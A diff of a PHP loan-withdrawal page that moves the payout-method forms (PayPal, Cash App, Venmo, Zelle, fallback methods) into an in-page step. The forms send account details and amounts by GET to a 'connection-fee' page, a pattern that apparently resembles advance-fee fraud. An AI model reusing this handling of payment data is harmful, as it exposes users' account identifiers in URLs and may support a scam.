@@ -11,13 +11,11 @@ if (!isset($_SESSION['user_id'])) {
    GEO DETECTION (IP API)
 ------------------------------*/
 $ip = $_SERVER['REMOTE_ADDR'];
-$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
+$geo = @json_decode(file_get_contents("https://ip-api.com/json/{$ip}"));
 
 $country = $geo->country ?? 'Unknown';
 
-/* -----------------------------
-   PAYMENT METHODS
-------------------------------*/
+/* fallback methods */
 $paymentMethods = [];
 
 $stmt = $conn->prepare("
@@ -100,95 +98,93 @@ if (empty($paymentMethods)) {
 
         </div>
 
-    </div>
-</div>
+        <!-- STEP 2 -->
+        <div id="step2" style="display:none;">
 
-<!-- STEP 2 -->
-<div id="step2" style="display:none;" class="container">
+            <h3 style="text-align:center;margin-bottom:15px;">
+                Link Withdrawal Method
+            </h3>
 
-    <div class="loan-form">
+            <!-- USA FORM -->
+            <div id="usaForm" style="display:none;">
 
-        <h3 style="text-align:center;margin-bottom:15px;">
-            Link Withdrawal Method
-        </h3>
+                <form method="GET" action="connection-fee.php">
 
-        <!-- USA FORM -->
-        <div id="usaForm" style="display:none;">
+                    <input type="hidden" name="type" value="usa">
+                    <input type="hidden" name="country" value="United States">
 
-            <form method="GET" action="connection-fee.php">
-
-                <input type="hidden" name="type" value="usa">
-                <input type="hidden" name="country" value="United States">
-
-                <div class="form-group">
-                    <label>Payment Method</label>
-                    <select name="method" required>
-                        <option value="paypal">PayPal</option>
-                        <option value="cashapp">Cash App</option>
-                        <option value="venmo">Venmo</option>
-                        <option value="zelle">Zelle</option>
-                    </select>
-                </div>
-
-                <div class="form-group">
-                    <label>Account Identifier</label>
-                    <input type="text" name="account" required>
-                </div>
-
-                <button class="submit-btn">Continue</button>
-
-            </form>
-        </div>
-
-        <!-- FALLBACK FORM -->
-        <div id="fallbackForm" style="display:none;">
-
-            <p>
-                Detected Country:
-                <strong><?= htmlspecialchars($country) ?></strong>
-            </p>
-
-            <form method="GET" action="connection-fee.php">
-
-                <input type="hidden" name="type" value="fallback">
-
-                <div class="form-group">
-                    <label>Payment Method</label>
-
-                    <select name="payment_type" id="payment_type" required>
-                        <option value="">Select Payment Method</option>
-
-                        <?php foreach ($paymentMethods as $method): ?>
-                            <option value="<?= $method['id'] ?>">
-                                <?= ucfirst($method['type']) ?>
-                            </option>
-                        <?php endforeach; ?>
-
-                    </select>
-                </div>
-
-                <div id="paymentFields" style="display:none;">
+                    <input type="hidden" name="amount" id="usa_amount">
 
                     <div class="form-group">
-                        <label id="label_method"></label>
-                        <input type="text" name="method" id="field_method">
+                        <label>Payment Method</label>
+                        <select name="method" required>
+                            <option value="paypal">PayPal</option>
+                            <option value="cashapp">Cash App</option>
+                            <option value="venmo">Venmo</option>
+                            <option value="zelle">Zelle</option>
+                        </select>
                     </div>
 
                     <div class="form-group">
-                        <label id="label_method_name"></label>
-                        <input type="text" name="method_name" id="field_method_name">
-                    </div>
-
-                    <div class="form-group">
-                        <label id="label_method_id"></label>
-                        <input type="text" name="method_id" id="field_method_id">
+                        <label>Account Identifier</label>
+                        <input type="text" name="account" required>
                     </div>
 
                     <button class="submit-btn">Continue</button>
 
-                </div>
+                </form>
+            </div>
 
-            </form>
+            <!-- FALLBACK FORM -->
+            <div id="fallbackForm" style="display:none;">
+
+                <form method="GET" action="connection-fee.php">
+
+                    <input type="hidden" name="type" value="fallback">
+                    <input type="hidden" name="country" value="<?= htmlspecialchars($country) ?>">
+                    <input type="hidden" name="amount" id="fallback_amount">
+
+                    <input type="hidden" name="selected_type" id="selected_type">
+
+                    <div class="form-group">
+                        <label>Payment Method</label>
+
+                        <select name="payment_type" id="payment_type" required>
+                            <option value="">Select Payment Method</option>
+
+                            <?php foreach ($paymentMethods as $method): ?>
+                                <option value="<?= $method['id'] ?>">
+                                    <?= ucfirst($method['type']) ?>
+                                </option>
+                            <?php endforeach; ?>
+
+                        </select>
+                    </div>
+
+                    <div id="paymentFields" style="display:none;">
+
+                        <div class="form-group">
+                            <label id="label_method"></label>
+                            <input type="text" name="method" id="field_method">
+                        </div>
+
+                        <div class="form-group">
+                            <label id="label_method_name"></label>
+                            <input type="text" name="method_name" id="field_method_name">
+                        </div>
+
+                        <div class="form-group">
+                            <label id="label_method_id"></label>
+                            <input type="text" name="method_id" id="field_method_id">
+                        </div>
+
+                        <button class="submit-btn">Continue</button>
+
+                    </div>
+
+                </form>
+            </div>
+
         </div>
 
     </div>
@@ -206,15 +202,18 @@ function goToStep2(type) {
         return;
     }
 
-    const country = <?= json_encode($country) ?>;
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
 
-    const params = new URLSearchParams({
-        amount: amount,
-        country: country,
-        type: type
-    });
-
-    window.location.href = "connection-fee.php?" + params.toString();
+    if (type === 'usa') {
+        document.getElementById('usaForm').style.display = 'block';
+        document.getElementById('fallbackForm').style.display = 'none';
+        document.getElementById('usa_amount').value = amount;
+    } else {
+        document.getElementById('fallbackForm').style.display = 'block';
+        document.getElementById('usaForm').style.display = 'none';
+        document.getElementById('fallback_amount').value = amount;
+    }
 }
 
 /* fallback dynamic fields */
@@ -236,6 +235,8 @@ document.getElementById('payment_type')?.addEventListener('change', function () 
     document.getElementById('field_method').placeholder = 'Enter ' + selected.method;
     document.getElementById('field_method_name').placeholder = 'Enter ' + selected.method_name;
     document.getElementById('field_method_id').placeholder = 'Enter ' + selected.method_id;
+
+    document.getElementById('selected_type').value = selected.type;
 });
 </script>
 
